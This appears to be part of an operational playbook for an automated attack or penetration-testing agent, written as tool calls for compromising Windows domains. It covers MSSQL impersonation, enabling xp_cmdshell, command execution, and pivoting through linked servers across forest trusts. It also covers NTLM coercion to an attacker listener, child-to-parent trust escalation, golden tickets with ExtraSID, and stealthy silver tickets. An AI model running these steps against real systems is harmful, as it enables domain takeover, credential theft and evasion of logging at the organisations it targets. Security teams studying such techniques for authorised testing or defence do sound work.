## MSSQL Attacks (HIGH PRIORITY)

MSSQL is often a path to domain compromise through impersonation and linked servers that cross domain/forest trusts.

### Step 1: Enumerate Impersonation Rights (RUN THIS FIRST!)
**CRITICAL**: Always check for impersonation rights before anything else - this is often the fastest path to sysadmin:
```
mssql_enum_impersonation(
    target="sql.domain.com",
    username="sql_svc",
    password="found_password",  # pragma: allowlist secret
    domain="DOMAIN.COM"
)
→ Discover users you can impersonate (sa, dbo, etc.)
→ If 'sa' is listed, you have a direct path to sysadmin!
```

### Step 2: Enumerate Linked Servers
When you have ANY valid SQL credential (from kerberoast, password spray, etc.):
```
mssql_enum_linked_servers(
    target="sql.domain.com",
    username="sql_svc",
    password="found_password",  # pragma: allowlist secret
    domain="DOMAIN.COM"
)
→ Find linked servers that can be pivoted through
```

### Step 3: Enable xp_cmdshell
If you have sysadmin privileges:
```
mssql_enable_xp_cmdshell(
    target="sql.domain.com",
    username="sa",
    password="password",  # pragma: allowlist secret
    domain="DOMAIN.COM"
)
→ Enable command execution
```

### Step 4: Execute Commands
After enabling xp_cmdshell:
```
mssql_command(
    target="sql.domain.com",
    username="sa",
    password="password",  # pragma: allowlist secret
    command="whoami /all",
    domain="DOMAIN.COM"
)
→ Execute OS commands as SQL service account
```

### Step 5: Pivot Through Linked Servers
When linked servers exist (cross-domain/forest pivoting!):
```
mssql_exec_linked(
    target="sql.domain.com",
    linked_server="remote-sql.otherdomain.com",
    query="SELECT SYSTEM_USER",
    username="sql_user",
    password="password",  # pragma: allowlist secret
    domain="DOMAIN.COM"
)
→ Execute queries on remote server

# Enable xp_cmdshell on linked server:
mssql_exec_linked(
    target="sql.domain.com",
    linked_server="remote-sql",
    query="EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
    ...
)

# Execute commands on linked server:
mssql_exec_linked(
    target="sql.domain.com",
    linked_server="remote-sql",
    query="EXEC xp_cmdshell 'whoami /all'",
    ...
)
→ Code execution across domain/forest trust!
```

### MSSQL Impersonation (Use After Enumeration)
After mssql_enum_impersonation shows you can impersonate a user:
```
# First: Run mssql_enum_impersonation to find targets (Step 1 above)
# Then: Impersonate the discovered user
mssql_impersonate(
    target="sql.domain.com",
    username="low_priv_user",
    password="password",  # pragma: allowlist secret
    impersonate_user="sa",  # Use user found in enumeration
    query="SELECT SYSTEM_USER",
    domain="DOMAIN.COM"
)
→ Execute as sysadmin user
→ If impersonating 'sa', you can enable xp_cmdshell and get code execution!
```

### MSSQL NTLM Coercion
Force SQL server to authenticate to your listener:
```
mssql_ntlm_coerce(
    target="sql.domain.com",
    username="sql_user",
    password="password",  # pragma: allowlist secret
    listener_ip="YOUR_IP",
    domain="DOMAIN.COM"
)
→ Capture machine account hash for relay to LDAPS
```

## Trust Attacks

### Child-to-Parent Escalation
When a child domain krbtgt hash is available:
```
raise_child(
    child_domain="child.domain.local",
    username="user",
    password="pass",  # pragma: allowlist secret
    target_domain="parent.domain.local"
)
→ Enterprise Admin, then secretsdump parent DCs
```

### Golden Ticket with ExtraSID (Manual)
If raise_child fails, manually forge ticket with Enterprise Admin SID:
```
1. Get child domain SID and parent domain SID (from BloodHound or lookupsid)
2. golden_ticket(
       domain="child.domain.local",
       domain_sid="S-1-5-21-child...",
       krbtgt_hash="aad3b435...",
       user="Administrator",
       extra_sid="S-1-5-21-parent...-519"  # Enterprise Admins
   )
   → Ticket valid in parent domain
3. Use ticket to secretsdump parent DCs
```

### Silver Ticket
Forge service ticket when you have a service account hash (no DC contact needed):
```
silver_ticket(
    domain="domain.com",
    domain_sid="S-1-5-21-...",
    service_hash="aad3b435...",  # Service account NTLM
    spn="cifs/target.domain.com",
    user="Administrator"
)
→ Access specific service as any user (stealthy, no DC logs)
```

Use cases:
- CIFS for file share access
- HTTP for web services
- MSSQL for database access
- HOST for PSExec-style execution

